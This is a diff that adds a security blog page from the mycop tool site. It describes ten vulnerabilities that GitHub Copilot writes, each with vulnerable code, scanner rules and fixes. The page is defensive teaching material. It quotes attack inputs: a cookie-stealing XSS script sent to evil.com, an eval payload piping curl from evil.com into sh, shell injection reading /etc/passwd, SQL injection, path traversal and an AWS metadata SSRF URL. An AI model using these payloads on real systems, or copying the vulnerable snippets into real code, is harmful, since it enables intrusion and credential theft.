@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en" style="scroll-behavior:smooth">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Top 10 Security Vulnerabilities GitHub Copilot Keeps Writing &mdash; mycop Blog</title>
+  <meta name="description"
+    content="The 10 most common security vulnerabilities GitHub Copilot introduces in Python and JavaScript code. For each: what the flaw is, vulnerable code examples, how mycop detects it, and how to fix it. With CWE references.">
+  <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+  <link rel="icon" type="image/png" href="../favicon.png">
+  <link rel="canonical" href="https://abdumajidrashidov.github.io/mycop/blog/top-10-copilot-vulnerabilities.html">
+  <meta name="theme-color" content="#0066ff">
+  <meta name="keywords" content="GitHub Copilot security, AI code vulnerabilities, Copilot security risks, AI generated code security, SAST, CWE, OWASP">
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="Top 10 Security Vulnerabilities GitHub Copilot Keeps Writing">
+  <meta property="og:description" content="The 10 most common security vulnerabilities GitHub Copilot introduces in your code &mdash; with vulnerable examples, CWE references, and automated detection with mycop.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://abdumajidrashidov.github.io/mycop/blog/top-10-copilot-vulnerabilities.html">
+  <meta property="og:image" content="https://abdumajidrashidov.github.io/mycop/og-image.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:site_name" content="mycop">
+  <meta property="og:locale" content="en_US">
+  <meta property="article:published_time" content="2026-02-15">
+  <meta property="article:author" content="Abdumajid Rashidov">
+  <meta property="article:section" content="Security">
+  <meta property="article:tag" content="GitHub Copilot">
+  <meta property="article:tag" content="Security">
+  <meta property="article:tag" content="Vulnerabilities">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Top 10 Security Vulnerabilities GitHub Copilot Keeps Writing">
+  <meta name="twitter:description" content="SQL injection, XSS, hardcoded secrets, and 7 more &mdash; the vulnerabilities Copilot writes by default, with fixes.">
+  <meta name="twitter:image" content="https://abdumajidrashidov.github.io/mycop/og-image.png">
+
+  <!-- Structured Data: Article -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Top 10 Security Vulnerabilities GitHub Copilot Keeps Writing",
+    "description": "The 10 most common security vulnerabilities GitHub Copilot introduces in Python and JavaScript code. For each: what the flaw is, vulnerable code examples, how mycop detects it, and how to fix it.",
+    "author": {
+      "@type": "Person",
+      "name": "Abdumajid Rashidov",
+      "url": "https://github.com/AbdumajidRashidov"
+    },
+    "datePublished": "2026-02-15",
+    "dateModified": "2026-02-15",
+    "publisher": {
+      "@type": "Organization",
+      "name": "mycop",
+      "url": "https://abdumajidrashidov.github.io/mycop/"
+    },
+    "mainEntityOfPage": "https://abdumajidrashidov.github.io/mycop/blog/top-10-copilot-vulnerabilities.html",
+    "keywords": ["GitHub Copilot security", "AI code vulnerabilities", "Copilot security risks", "SAST", "CWE", "OWASP", "Python security", "JavaScript security"],
+    "wordCount": 4200,
+    "timeRequired": "PT18M"
+  }
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+    rel="stylesheet">
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg: #ffffff;
+      --bg-alt: #f8f9fa;
+      --text: #1a1a2e;
+      --text-secondary: #6c757d;
+      --accent: #0066ff;
+      --accent-hover: #0052cc;
+      --border: #e9ecef;
+      --terminal-bg: #1e1e2e;
+      --terminal-text: #cdd6f4;
+      --red: #f38ba8;
+      --yellow: #f9e2af;
+      --green: #a6e3a1;
+      --blue: #89b4fa;
+      --radius: 12px;
+      --shadow: 0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06);
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      color: var(--text);
+      background: var(--bg);
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    code,
+    .mono {
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+
+    a:hover {
+      color: var(--accent-hover);
+    }
+
+    /* Nav */
+    nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    nav .nav-inner {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 64px;
+    }
+
+    .nav-logo {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .nav-logo svg {
+      width: 28px;
+      height: 28px;
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .nav-links a {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    .nav-links a:hover {
+      color: var(--text);
+    }
+
+    /* Article */
+    .article {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 60px 24px 80px;
+    }
+
+    .article-meta {
+      margin-bottom: 32px;
+    }
+
+    .article-meta .tag {
+      display: inline-block;
+      padding: 4px 12px;
+      background: #eef4ff;
+      color: var(--accent);
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      margin-right: 6px;
+    }
+
+    .article-meta .date {
+      display: block;
+      margin-top: 12px;
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+    }
+
+    .article h1 {
+      font-size: clamp(2rem, 4vw, 2.5rem);
+      font-weight: 700;
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+      margin-bottom: 24px;
+    }
+
+    .article h2 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-top: 48px;
+      margin-bottom: 16px;
+      letter-spacing: -0.01em;
+    }
+
+    .article h3 {
+      font-size: 1.15rem;
+      font-weight: 600;
+      margin-top: 36px;
+      margin-bottom: 12px;
+    }
+
+    .article p {
+      margin-bottom: 16px;
+      font-size: 1.05rem;
+      line-height: 1.75;
+    }
+
+    .article strong {
+      font-weight: 600;
+    }
+
+    .article em {
+      font-style: italic;
+    }
+
+    .article ol,
+    .article ul {
+      margin-bottom: 16px;
+      padding-left: 24px;
+    }
+
+    .article li {
+      margin-bottom: 8px;
+      font-size: 1.05rem;
+      line-height: 1.7;
+    }
+
+    .article hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 48px 0;
+    }
+
+    .article blockquote {
+      border-left: 3px solid var(--accent);
+      padding-left: 16px;
+      margin: 20px 0;
+      color: var(--text-secondary);
+      font-style: italic;
+    }
+
+    /* Code blocks */
+    .article pre {
+      background: var(--terminal-bg);
+      color: var(--terminal-text);
+      border-radius: var(--radius);
+      padding: 20px 24px;
+      margin-bottom: 20px;
+      overflow-x: auto;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      line-height: 1.7;
+    }
+
+    .article code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.88em;
+    }
+
+    .article p code,
+    .article li code,
+    .article h3 code {
+      background: #eef4ff;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.85em;
+      color: var(--accent);
+    }
+
+    .article .pre-label {
+      display: block;
+      margin-bottom: 4px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    /* Detection box */
+    .detection-box {
+      background: var(--bg-alt);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px 24px;
+      margin: 16px 0 20px;
+    }
+
+    .detection-box p {
+      margin-bottom: 8px;
+      font-size: 0.95rem;
+    }
+
+    .detection-box p:last-child {
+      margin-bottom: 0;
+    }
+
+    .detection-box .rule-id {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      color: var(--accent);
+      font-weight: 600;
+    }
+
+    .sev-critical {
+      color: #f38ba8;
+      font-weight: 700;
+    }
+
+    .sev-high {
+      color: #fab387;
+      font-weight: 700;
+    }
+
+    .sev-medium {
+      color: #f9e2af;
+      font-weight: 600;
+    }
+
+    /* Stats callout */
+    .stat-callout {
+      background: linear-gradient(135deg, #eef4ff 0%, #f8f9fa 100%);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px 28px;
+      margin: 24px 0;
+    }
+
+    .stat-callout p {
+      margin-bottom: 0;
+      font-size: 1rem;
+      line-height: 1.7;
+    }
+
+    .stat-callout strong {
+      color: var(--accent);
+    }
+
+    /* CTA box */
+    .cta-box {
+      background: var(--bg-alt);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 32px;
+      margin: 40px 0;
+      text-align: center;
+    }
+
+    .cta-box h3 {
+      margin-top: 0;
+      margin-bottom: 12px;
+    }
+
+    .cta-box p {
+      font-size: 0.95rem;
+      margin-bottom: 16px;
+    }
+
+    .cta-box .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 20px;
+      background: var(--accent);
+      color: #fff;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-weight: 600;
+    }
+
+    .cta-box .btn:hover {
+      background: var(--accent-hover);
+      color: #fff;
+    }
+
+    /* Footer */
+    footer {
+      padding: 40px 0;
+      border-top: 1px solid var(--border);
+      color: var(--text-secondary);
+      font-size: 0.85rem;
+    }
+
+    footer .footer-inner {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    footer a {
+      color: var(--text-secondary);
+    }
+
+    footer a:hover {
+      color: var(--text);
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 20px;
+    }
+
+    @media (max-width: 768px) {
+      .article {
+        padding: 40px 20px 60px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav>
+    <div class="nav-inner">
+      <a href="../" class="nav-logo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+          stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+        </svg>
+        mycop
+      </a>
+      <div class="nav-links">
+        <a href="../">Home</a>
+        <a href="https://github.com/AbdumajidRashidov/mycop" target="_blank">GitHub</a>
+      </div>
+    </div>
+  </nav>
+
+  <article class="article">
+
+    <div class="article-meta">
+      <span class="tag">Security</span>
+      <span class="tag">GitHub Copilot</span>
+      <span class="tag">Python</span>
+      <span class="tag">JavaScript</span>
+      <span class="date">February 15, 2026 &middot; 18 min read &middot; By Abdumajid Rashidov</span>
+    </div>
+
+    <h1>Top 10 Security Vulnerabilities GitHub Copilot Keeps Writing</h1>
+
+    <p>GitHub Copilot has changed how developers write code. With 85% of developers now using AI coding tools and AI generating 46% of all new code, the productivity gains are undeniable. But there is a problem nobody talks about enough: <strong>Copilot keeps writing the same security vulnerabilities over and over</strong>.</p>
+
+    <div class="stat-callout">
+      <p>According to Veracode's 2025 report, <strong>45% of AI-generated code introduces security flaws</strong>. An ACM study found that <strong>29.5% of Python Copilot snippets contain CWE weaknesses</strong>. And researchers measured an <strong>86% failure rate for XSS defense</strong> in AI-generated code.</p>
+    </div>
+
+    <p>I have spent months analyzing the code that Copilot, ChatGPT, and Cursor generate across real-world projects. The same 10 vulnerability types appear again and again. In this post, I am going to show you each one with real vulnerable code, explain why it is dangerous, show how <a href="https://github.com/AbdumajidRashidov/mycop">mycop</a> catches it, and give you the secure alternative.</p>
+
+    <hr>
+
+    <h2>1. SQL Injection via String Formatting</h2>
+
+    <p><strong>CWE-89 &middot; Severity: Critical</strong></p>
+
+    <p>This is the single most common vulnerability Copilot writes. Ask it for any database query, and you will almost certainly get string interpolation instead of parameterized queries.</p>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>def get_user(username):
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    cursor.execute(query)
+    return cursor.fetchone()
+
+def search_products(category):
+    sql = "SELECT * FROM products WHERE category = '%s'" % category
+    db.execute(sql)</pre>
+
+    <p><strong>Why it is dangerous:</strong> An attacker can pass <code>' OR '1'='1' --</code> as the username, which transforms the query into <code>SELECT * FROM users WHERE username = '' OR '1'='1' --'</code>, returning every row in the table. Worse, they can chain <code>; DROP TABLE users; --</code> to destroy data.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-001</span> / <span class="rule-id">PY-SEC-042</span> <span class="sev-critical">CRITICAL</span></p>
+      <p>mycop detects f-strings, % formatting, and .format() calls inside SQL query strings. It flags any string concatenation pattern used with database execute methods.</p>
+    </div>
+
+    <span class="pre-label">How mycop catches it</span>
+<pre>$ mycop scan app.py
+
+  app.py:2
+  CRITICAL sql injection via string formatting (CWE-89)
+
+       1 | def get_user(username):
+  ->   2 |     query = f"SELECT * FROM users WHERE username = '{username}'"
+       3 |     cursor.execute(query)
+
+     Possible SQL injection detected. User input may be directly
+     interpolated into a SQL query string.
+     Fix: Use parameterized queries with placeholders</pre>
+
+    <span class="pre-label">Secure alternative</span>
+<pre>def get_user(username):
+    cursor.execute(
+        "SELECT * FROM users WHERE username = %s",
+        (username,)
+    )
+    return cursor.fetchone()</pre>
+
+    <hr>
+
+    <h2>2. Cross-Site Scripting (XSS)</h2>
+
+    <p><strong>CWE-79 &middot; Severity: High</strong></p>
+
+    <p>Copilot has an 86% failure rate when it comes to XSS defense. It consistently generates code that renders user input as raw HTML without sanitization.</p>
+
+    <span class="pre-label">Vulnerable code (JavaScript / React)</span>
+<pre>// React component
+function Comment({ text }) {
+    return &lt;div dangerouslySetInnerHTML={{ __html: text }} /&gt;;
+}
+
+// Express route
+app.get('/search', (req, res) =&gt; {
+    res.send(`&lt;h1&gt;Results for: ${req.query.q}&lt;/h1&gt;`);
+});</pre>
+
+    <p><strong>Why it is dangerous:</strong> An attacker injects <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code> into the <code>text</code> prop or the <code>q</code> parameter. Every user who views the page has their session cookie exfiltrated.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">JS-SEC-001</span> / <span class="rule-id">JS-SEC-010</span> / <span class="rule-id">JS-SEC-041</span> <span class="sev-high">HIGH</span></p>
+      <p>mycop detects <code>dangerouslySetInnerHTML</code> usage, <code>innerHTML</code> assignments, and unsanitized template literals in response bodies.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative</span>
+<pre>import DOMPurify from 'dompurify';
+
+function Comment({ text }) {
+    return &lt;div dangerouslySetInnerHTML={{
+        __html: DOMPurify.sanitize(text)
+    }} /&gt;;
+}
+
+// Or better: let React handle escaping
+function Comment({ text }) {
+    return &lt;div&gt;{text}&lt;/div&gt;;
+}</pre>
+
+    <hr>
+
+    <h2>3. Hardcoded Secrets and API Keys</h2>
+
+    <p><strong>CWE-798 &middot; Severity: Critical</strong></p>
+
+    <p>Research shows that 6.4% of Copilot-assisted repositories leak secrets &mdash; 40% higher than repositories without AI assistance. Every time you ask Copilot to connect to an API, the key ends up in source code.</p>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>API_KEY = "sk-proj-abc123def456ghi789jkl012mno345"
+DATABASE_URL = "postgresql://admin:SuperSecret123@db.example.com/prod"
+JWT_SECRET = "my-super-secret-jwt-key-do-not-share"
+
+client = OpenAI(api_key="sk-1234567890abcdef")</pre>
+
+    <p><strong>Why it is dangerous:</strong> Once committed to version control, secrets are exposed to everyone with repository access and persist in git history even if deleted later. Automated scrapers on GitHub harvest exposed keys within minutes.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-003</span> / <span class="rule-id">PY-SEC-034</span> / <span class="rule-id">PY-SEC-043</span> / <span class="rule-id">JS-SEC-004</span> / <span class="rule-id">JS-SEC-034</span> <span class="sev-critical">CRITICAL</span></p>
+      <p>mycop detects hardcoded credentials including API keys, passwords, database connection strings, JWT secrets, and private keys using pattern matching for common key formats.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative</span>
+<pre>import os
+
+API_KEY = os.environ["OPENAI_API_KEY"]
+DATABASE_URL = os.environ["DATABASE_URL"]
+JWT_SECRET = os.environ["JWT_SECRET"]
+
+client = OpenAI()  # reads OPENAI_API_KEY from env automatically</pre>
+
+    <hr>
+
+    <h2>4. Command Injection</h2>
+
+    <p><strong>CWE-78 &middot; Severity: Critical</strong></p>
+
+    <p>Copilot loves <code>os.system()</code> and <code>child_process.exec()</code>. It consistently builds shell commands with string concatenation, creating direct paths to remote code execution.</p>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>import os
+
+def convert_image(filename, output_format):
+    os.system(f"convert {filename} output.{output_format}")
+
+def ping_host(host):
+    os.system("ping -c 1 " + host)</pre>
+
+    <span class="pre-label">Vulnerable code (JavaScript)</span>
+<pre>const { exec } = require('child_process');
+
+function runDiagnostic(hostname) {
+    exec(`nslookup ${hostname}`, (err, stdout) =&gt; {
+        console.log(stdout);
+    });
+}</pre>
+
+    <p><strong>Why it is dangerous:</strong> If <code>host</code> is <code>; cat /etc/passwd</code>, the shell executes both commands. For a web-facing application, this is full remote code execution &mdash; the attacker controls your server.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-002</span> / <span class="rule-id">PY-SEC-045</span> / <span class="rule-id">PY-SEC-050</span> / <span class="rule-id">JS-SEC-016</span> <span class="sev-critical">CRITICAL</span></p>
+      <p>mycop detects <code>os.system()</code>, <code>os.popen()</code>, <code>subprocess.call()</code> with <code>shell=True</code>, and <code>child_process.exec()</code> with string interpolation.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative (Python)</span>
+<pre>import subprocess
+
+def convert_image(filename, output_format):
+    subprocess.run(
+        ["convert", filename, f"output.{output_format}"],
+        check=True
+    )
+
+def ping_host(host):
+    subprocess.run(["ping", "-c", "1", host], check=True)</pre>
+
+    <hr>
+
+    <h2>5. Insecure Deserialization</h2>
+
+    <p><strong>CWE-502 &middot; Severity: Critical</strong></p>
+
+    <p>Ask Copilot to load data from a file or network, and it reaches for <code>pickle</code> in Python or <code>node-serialize</code> in JavaScript without hesitation.</p>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>import pickle
+
+def load_session(data):
+    return pickle.loads(data)
+
+def load_model(path):
+    with open(path, 'rb') as f:
+        return pickle.load(f)</pre>
+
+    <p><strong>Why it is dangerous:</strong> <code>pickle</code> executes arbitrary Python code during deserialization. An attacker can craft a payload that runs any system command when unpickled. This is not a theoretical risk &mdash; it is trivially exploitable.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-007</span> / <span class="rule-id">JS-SEC-009</span> <span class="sev-critical">CRITICAL</span></p>
+      <p>mycop detects usage of <code>pickle.loads()</code>, <code>pickle.load()</code>, <code>yaml.load()</code> without <code>SafeLoader</code>, and JavaScript deserialization with <code>node-serialize</code>.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative</span>
+<pre>import json
+
+def load_session(data):
+    return json.loads(data)
+
+# For ML models, use safetensors or ONNX format
+from safetensors import safe_open
+def load_model(path):
+    with safe_open(path, framework="pt") as f:
+        return {k: f.get_tensor(k) for k in f.keys()}</pre>
+
+    <hr>
+
+    <h2>6. Eval/Exec Injection</h2>
+
+    <p><strong>CWE-95 &middot; Severity: Critical</strong></p>
+
+    <p>Copilot regularly suggests <code>eval()</code> for parsing JSON, evaluating math expressions, or dynamically executing code. In every case, there is a safer alternative.</p>
+
+    <span class="pre-label">Vulnerable code (JavaScript)</span>
+<pre>// "Parse" JSON the wrong way
+function parseData(input) {
+    return eval('(' + input + ')');
+}
+
+// Calculator
+app.post('/calculate', (req, res) =&gt; {
+    const result = eval(req.body.expression);
+    res.json({ result });
+});</pre>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>def evaluate_formula(formula):
+    return eval(formula)
+
+def run_user_code(code_string):
+    exec(code_string)</pre>
+
+    <p><strong>Why it is dangerous:</strong> <code>eval()</code> executes any code. In Node.js, an attacker sends <code>require('child_process').execSync('whoami').toString()</code> as the expression. In Python, <code>__import__('os').system('curl evil.com/shell.sh | sh')</code>. Full remote code execution.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-005</span> / <span class="rule-id">JS-SEC-002</span> / <span class="rule-id">JS-SEC-049</span> <span class="sev-critical">CRITICAL</span></p>
+      <p>mycop flags all usage of <code>eval()</code> and <code>exec()</code> in both Python and JavaScript, with context-aware detection for user-controlled input.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative</span>
+<pre>// JavaScript: use JSON.parse for data, mathjs for expressions
+const math = require('mathjs');
+
+function parseData(input) {
+    return JSON.parse(input);
+}
+
+app.post('/calculate', (req, res) =&gt; {
+    const result = math.evaluate(req.body.expression);
+    res.json({ result });
+});
+
+# Python: use ast.literal_eval for data structures
+import ast
+def evaluate_formula(formula):
+    return ast.literal_eval(formula)</pre>
+
+    <hr>
+
+    <h2>7. Path Traversal</h2>
+
+    <p><strong>CWE-22 &middot; Severity: High</strong></p>
+
+    <p>Copilot generates file-serving code that trusts user-supplied filenames without any validation, allowing attackers to read arbitrary files from the server.</p>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>from flask import Flask, request, send_file
+
+app = Flask(__name__)
+
+@app.route('/download')
+def download():
+    filename = request.args.get('file')
+    return send_file(f'/uploads/{filename}')</pre>
+
+    <span class="pre-label">Vulnerable code (JavaScript)</span>
+<pre>const express = require('express');
+const path = require('path');
+const fs = require('fs');
+
+app.get('/files/:name', (req, res) =&gt; {
+    const filePath = path.join('/uploads', req.params.name);
+    res.sendFile(filePath);
+});</pre>
+
+    <p><strong>Why it is dangerous:</strong> An attacker requests <code>/download?file=../../etc/passwd</code> or <code>/files/..%2F..%2Fetc%2Fpasswd</code>. The <code>..</code> sequences traverse up the directory tree, allowing the attacker to read any file on the system including configuration files, credentials, and private keys.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-006</span> / <span class="rule-id">PY-SEC-037</span> / <span class="rule-id">JS-SEC-006</span> / <span class="rule-id">JS-SEC-037</span> <span class="sev-high">HIGH</span></p>
+      <p>mycop detects file operations that use user-controlled input without path validation, including zip extraction (Zip Slip) patterns.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative (Python)</span>
+<pre>import os
+from flask import Flask, request, send_file, abort
+
+UPLOAD_DIR = '/uploads'
+
+@app.route('/download')
+def download():
+    filename = request.args.get('file')
+    safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
+    if not safe_path.startswith(os.path.realpath(UPLOAD_DIR)):
+        abort(403)
+    return send_file(safe_path)</pre>
+
+    <hr>
+
+    <h2>8. Insecure Cryptography</h2>
+
+    <p><strong>CWE-327/328 &middot; Severity: High</strong></p>
+
+    <p>Copilot routinely suggests MD5 and SHA1 for password hashing, DES for encryption, and ECB mode for block ciphers. All of these have been broken for years.</p>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>import hashlib
+
+def hash_password(password):
+    return hashlib.md5(password.encode()).hexdigest()
+
+def verify_password(password, stored_hash):
+    return hashlib.sha1(password.encode()).hexdigest() == stored_hash</pre>
+
+    <span class="pre-label">Vulnerable code (JavaScript)</span>
+<pre>const crypto = require('crypto');
+
+function hashPassword(password) {
+    return crypto.createHash('md5').update(password).digest('hex');
+}
+
+// DES encryption
+const cipher = crypto.createCipheriv('des-ecb', key, null);</pre>
+
+    <p><strong>Why it is dangerous:</strong> MD5 produces collisions in seconds. SHA1 is considered broken since 2017. Neither applies salting or key stretching, making rainbow table attacks trivial. DES has a 56-bit key &mdash; it can be brute-forced in hours. ECB mode leaks patterns in encrypted data.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-017</span>&ndash;<span class="rule-id">PY-SEC-021</span> / <span class="rule-id">JS-SEC-017</span>&ndash;<span class="rule-id">JS-SEC-022</span> <span class="sev-high">HIGH</span></p>
+      <p>mycop detects MD5, SHA1, DES, RC4, ECB mode, and other weak cryptographic constructs across both Python and JavaScript.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative (Python)</span>
+<pre>import bcrypt
+
+def hash_password(password):
+    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())
+
+def verify_password(password, stored_hash):
+    return bcrypt.checkpw(password.encode(), stored_hash)
+
+# For encryption, use AES-256-GCM
+from cryptography.fernet import Fernet
+key = Fernet.generate_key()
+cipher = Fernet(key)</pre>
+
+    <hr>
+
+    <h2>9. Server-Side Request Forgery (SSRF)</h2>
+
+    <p><strong>CWE-918 &middot; Severity: High</strong></p>
+
+    <p>Copilot generates HTTP request code that passes user-supplied URLs directly to request libraries without any validation or allowlisting.</p>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>import requests
+from flask import request
+
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    response = requests.get(url)
+    return response.text</pre>
+
+    <span class="pre-label">Vulnerable code (JavaScript)</span>
+<pre>const axios = require('axios');
+
+app.get('/proxy', async (req, res) =&gt; {
+    const response = await axios.get(req.query.url);
+    res.json(response.data);
+});</pre>
+
+    <p><strong>Why it is dangerous:</strong> An attacker sends <code>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> to access AWS instance metadata and steal IAM credentials. They can also probe internal networks, access internal services, and read local files via <code>file://</code> URLs.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-011</span> / <span class="rule-id">JS-SEC-007</span> <span class="sev-high">HIGH</span></p>
+      <p>mycop detects HTTP requests where the URL is derived from user input without validation or allowlisting.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative (Python)</span>
+<pre>from urllib.parse import urlparse
+
+ALLOWED_HOSTS = {'api.example.com', 'cdn.example.com'}
+
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    parsed = urlparse(url)
+    if parsed.hostname not in ALLOWED_HOSTS:
+        abort(403, "Host not allowed")
+    if parsed.scheme not in ('http', 'https'):
+        abort(403, "Scheme not allowed")
+    response = requests.get(url, timeout=5)
+    return response.text</pre>
+
+    <hr>
+
+    <h2>10. Insecure Random Number Generation</h2>
+
+    <p><strong>CWE-330 &middot; Severity: Medium</strong></p>
+
+    <p>Copilot uses <code>Math.random()</code> and Python's <code>random</code> module for generating tokens, session IDs, and passwords. These are not cryptographically secure &mdash; their output is predictable.</p>
+
+    <span class="pre-label">Vulnerable code (JavaScript)</span>
+<pre>function generateToken() {
+    return Math.random().toString(36).substring(2);
+}
+
+function generateSessionId() {
+    let id = '';
+    for (let i = 0; i &lt; 32; i++) {
+        id += Math.floor(Math.random() * 16).toString(16);
+    }
+    return id;
+}</pre>
+
+    <span class="pre-label">Vulnerable code (Python)</span>
+<pre>import random
+import string
+
+def generate_password(length=16):
+    chars = string.ascii_letters + string.digits
+    return ''.join(random.choice(chars) for _ in range(length))
+
+def generate_reset_token():
+    return str(random.randint(100000, 999999))</pre>
+
+    <p><strong>Why it is dangerous:</strong> <code>Math.random()</code> uses a PRNG that can be reverse-engineered from its output. Python's <code>random</code> module uses the Mersenne Twister, which can be fully reconstructed from 624 outputs. An attacker who observes enough tokens can predict future ones, allowing session hijacking or password reset takeover.</p>
+
+    <div class="detection-box">
+      <p><strong>mycop detection:</strong> <span class="rule-id">PY-SEC-004</span> / <span class="rule-id">JS-SEC-005</span> <span class="sev-medium">MEDIUM</span></p>
+      <p>mycop detects usage of <code>Math.random()</code> and <code>random.choice()</code>/<code>random.randint()</code> in security-sensitive contexts like token and password generation.</p>
+    </div>
+
+    <span class="pre-label">Secure alternative</span>
+<pre>// JavaScript: use crypto module
+const crypto = require('crypto');
+
+function generateToken() {
+    return crypto.randomBytes(32).toString('hex');
+}
+
+# Python: use secrets module
+import secrets
+
+def generate_password(length=16):
+    chars = string.ascii_letters + string.digits
+    return ''.join(secrets.choice(chars) for _ in range(length))
+
+def generate_reset_token():
+    return secrets.token_urlsafe(32)</pre>
+
+    <hr>
+
+    <h2>The Pattern: Why Copilot Keeps Making These Mistakes</h2>
+
+    <p>All 10 vulnerabilities share the same root cause: <strong>Copilot optimizes for functionality, not security</strong>. It generates code that works correctly for the happy path but ignores adversarial inputs entirely.</p>
+
+    <p>Three factors make this worse:</p>
+
+    <ol>
+      <li><strong>Training data bias.</strong> Stack Overflow answers and tutorials prioritize simplicity. The top answer for "how to hash a password in Python" may still use MD5. Copilot learns from what is popular, not what is secure.</li>
+      <li><strong>No threat modeling.</strong> Copilot has no concept of an attacker. It does not reason about who will call a function or what malicious input they might provide.</li>
+      <li><strong>Developer trust.</strong> Studies show developers who use AI assistants are <em>more confident</em> their code is secure, even when it is not. The fluency and correctness of the output creates false assurance.</li>
+    </ol>
+
+    <div class="stat-callout">
+      <p>The numbers tell the story: <strong>10,000+ new AI-introduced security findings per month</strong> are being reported across organizations using AI coding tools. The volume is increasing as AI-generated code becomes a larger share of all production code.</p>
+    </div>
+
